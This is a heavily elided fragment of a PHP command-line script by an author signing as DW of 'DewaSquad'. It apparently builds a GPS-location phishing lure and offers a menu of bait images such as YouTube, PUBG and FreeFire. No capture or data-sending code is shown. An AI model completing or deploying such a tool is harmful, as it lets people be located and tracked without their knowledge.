...
/*
	...
	Fanspage: https://www.facebook.com/DewaSquadOffical
				{ OpenSourceCode }
*/
...
// }else{
// 	echo "\n\n[-] Tidak Ada Koneksi Internet Kasian amat lu bro :'( \n\n";
// 	exit();
// }
...
Author   : DW
Contact  : wclanoffical@gmail.com
FansPage : https://www.facebook.com/DewaSquadOffical/
...
if ($pilih == '--GPS' || $pilih == '--gps') {
	...
	if (is_numeric($port)) {
		...
		echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Hacker (6) Custom ? \n";
		echo "[+] Use Image => : ";
		...
		switch ($opsi_img) {
			...
			case '4':
				...
				break;
			case '5':
				$img = 'https://www.freepik.com/free-photo/hacker-with-laptop_3361141.htm';
				break;
			case '6':
				echo "[+] Image URL => : ";
